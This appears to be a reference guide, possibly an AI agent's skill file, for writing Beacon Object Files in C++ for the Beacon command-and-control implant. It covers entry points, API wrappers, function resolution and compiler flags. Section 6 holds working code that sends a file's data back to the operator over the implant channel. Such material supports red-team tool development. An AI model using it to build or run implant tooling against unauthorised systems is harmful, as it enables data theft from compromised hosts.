# C++ BOF — Reference Guide

Reference for writing Beacon Object Files in C++ with safe patterns.

---

## 1. Entry point

The BOF entry point must use C linkage:

```cpp
extern "C" void go(char* args, int len) {
    // ...
}
```

Without `extern "C"`, the function name gets mangled and the Beacon loader
cannot find the `go` symbol.

---

## 2. Beacon API from C++

Include `beacon.h` inside an `extern "C"` block:

```cpp
extern "C" {
#include "beacon.h"
}
```

All Beacon API calls (`BeaconPrintf`, `BeaconDataParse`, etc.) work
identically to C. See the `c-bof` skill for the full API table.

---

## 3. RAII wrappers and safe features

See **`references/cpp-raii.md`** for the complete RAII wrapper library
(`bof::Handle`, `bof::HeapBuf`, `bof::Format`, `bof::RegKey`), the safe C++
feature matrix, factory RAII for borrowed resources, and common pitfalls.

Quick reference — available wrappers (all in `bof` namespace):

| Wrapper | Manages | Header needed |
|---------|---------|---------------|
| `bof::Handle` | `HANDLE` via `KERNEL32$CloseHandle` | `beacon.h` |
| `bof::HeapBuf` | Heap buffer via `HeapAlloc`/`HeapFree` | `beacon.h` |
| `bof::Format` | `formatp` via `BeaconFormatAlloc`/`Free` | `beacon.h` |
| `bof::RegKey` | `HKEY` via `ADVAPI32$RegCloseKey` | `beacon.h` |

---

## 4. DFR and runtime resolution

See **`references/dfr-and-resolution.md`** for:
- Standard `DECLSPEC_IMPORT` vs typedef + `GetProcAddress` strategy
- GDI+ flat API integration (no C++ wrapper classes)
- COM / IStream usage
- Dual-build support (`#ifdef BOF`)

---

## 5. Template utilities

### Compile-time string length

```cpp
template<size_t N>
constexpr size_t bof_strlen(const char (&)[N]) { return N - 1; }
```

### Type-safe BeaconPrintf wrapper

```cpp
template<typename... Args>
void bof_log(const char* fmt, Args... args) {
    BeaconPrintf(CALLBACK_OUTPUT, (char*)fmt, args...);
}

template<typename... Args>
void bof_err(const char* fmt, Args... args) {
    BeaconPrintf(CALLBACK_ERROR, (char*)fmt, args...);
}
```

---

## 6. File download over Beacon channel

Use `CALLBACK_FILE`, `CALLBACK_FILE_WRITE`, `CALLBACK_FILE_CLOSE` for
chunked file transfer back to the operator:

```cpp
static void downloadFile(const char* fileName, const char* data, int dataLen) {
    int nameLen = (int)MSVCRT$strlen(fileName) + 1;
    char* start = (char*)KERNEL32$HeapAlloc(
        KERNEL32$GetProcessHeap(), 0, 4 + nameLen);
    *(int*)start = nameLen;
    MSVCRT$memcpy(start + 4, fileName, nameLen);
    BeaconOutput(CALLBACK_FILE, start, 4 + nameLen);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, start);

    int offset = 0;
    while (offset < dataLen) {
        int chunk = dataLen - offset;
        if (chunk > 900 * 1024) chunk = 900 * 1024;
        BeaconOutput(CALLBACK_FILE_WRITE, data + offset, chunk);
        offset += chunk;
    }
    BeaconOutput(CALLBACK_FILE_CLOSE, NULL, 0);
}
```

Use `CALLBACK_SCREENSHOT` (0x03) for screenshot data.

---

## 7. Compiler flags reference

```bash
x86_64-w64-mingw32-g++ \
    -std=c++17 \
    -m64 -c \
    -O2 \
    -fno-exceptions \
    -fno-rtti \
    -fno-asynchronous-unwind-tables \
    -fno-ident \
    -fpack-struct=8 \
    -falign-functions=1 \
    -ffunction-sections \
    -fdata-sections \
    -fno-merge-constants \
    -s \
    -o output.o \
    -I./assets \
    source.cpp
```
